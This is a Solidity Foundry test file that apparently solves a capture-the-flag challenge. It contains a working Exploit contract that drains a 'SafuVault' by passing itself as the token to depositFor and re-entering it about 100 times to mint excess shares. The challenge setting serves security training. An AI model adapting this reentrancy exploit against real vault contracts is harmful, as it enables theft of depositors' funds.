// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {SafuStrategy} from "src/safu-vault/SafuStrategy.sol";
import {SafuVault,IStrategy} from "src/safu-vault/SafuVault.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    Token usdc;
    SafuVault safuVault;
    SafuStrategy safuStrategy;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contract
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=attacker; addresses[1]=adminUser;
        amounts[0]=10_000e18; amounts[1]=10_000e18;
        
        // attacker gets 10_000 USDC as starting funds
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        // deploying core contracts
        vm.prank(admin);
        safuStrategy = new SafuStrategy(address(usdc));
        vm.prank(admin);
        safuVault = new SafuVault(IStrategy(address(safuStrategy)),'LP Token','LP');

        vm.prank(admin);
        safuStrategy.setVault(address(safuVault));

        // other user deposits 10_000 USDC into the safu yield vault
        vm.prank(adminUser);
        usdc.approve(address(safuVault),type(uint).max);
        vm.prank(adminUser);
        safuVault.depositAll();

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
        console.log("balance usdc of safuvault :", usdc.balanceOf(address(safuVault)));
        console.log("balance shares of adminUser :", safuVault.balanceOf(address(adminUser)));
        console.log("balance usdc of attacker :", usdc.balanceOf(address(attacker)));

        //Reentrancy inside sauVault due to the function depositFor
        //We can choose the token address for the call safeTransferFrom
        Exploit _exploit = new Exploit();  
        usdc.transfer(address(_exploit),usdc.balanceOf(address(attacker)));
        _exploit.pwn(address(safuVault),address(usdc));

        console.log("total shares :", safuVault.totalSupply());
        console.log("balance shares of attacker :", safuVault.balanceOf(address(attacker)));
        console.log("balance usdc of exploit :", usdc.balanceOf(address(_exploit)));

        safuVault.withdrawAll();
        console.log("balance usdc of attacker :", usdc.balanceOf(address(attacker)));
        
        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker drains >= 90% of funds
        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault))+usdc.balanceOf(address(safuStrategy));
        assertLe(totalVaultFunds,1_000e18);
        assertGe(usdc.balanceOf(attacker),19_000e18);

    }

}

contract Exploit {

    uint256 reentrancy_count;
    uint count;
    uint amount;
    Token usdc;
    SafuVault safuVault;
    address owner;

    constructor (){}   
    

    function transferFrom(
        address from,
        address to,
        uint256 _amount
    ) public  returns (bool) {

        if(count < reentrancy_count){ //reentrancy_count condition
            count++;
            safuVault.depositFor(address(this),uint256(0),owner); //Here is the reentrancy
            usdc.transfer(address(safuVault),amount); //increase value _after of depositFor()
            /*
            Scheme example:
            _pool 10_000
                _pool 10_000
                    _pool 10_000
                        _pool 10_000
                            _pool 10_000  
                            _after 10_100 -> amount = 100
                        _after 10_200 -> amount = 200
                    _after 10_300 -> amount = 300
                _after 10_400 -> amount = 400
            _after 10_500 -> amount = 500    
            */
        }
        return true;
    }

    //Reentrancy via the function depositFor of the SafuVault contract
    //We will mint more shares that we supposed to be due to the reentrancy
    function pwn(address _target, address _usdc) external {
        owner=msg.sender;
        usdc=Token(_usdc);
        safuVault=SafuVault(_target);
        reentrancy_count= (usdc.balanceOf(address(this))/100 ether); // Number of times we will reenter = 100 times
        amount = usdc.balanceOf(address(this))/reentrancy_count ; // amount to deposit per reentrancy
        safuVault.depositFor(address(this),uint256(0),msg.sender); //Begin of the reentrancy
    }


}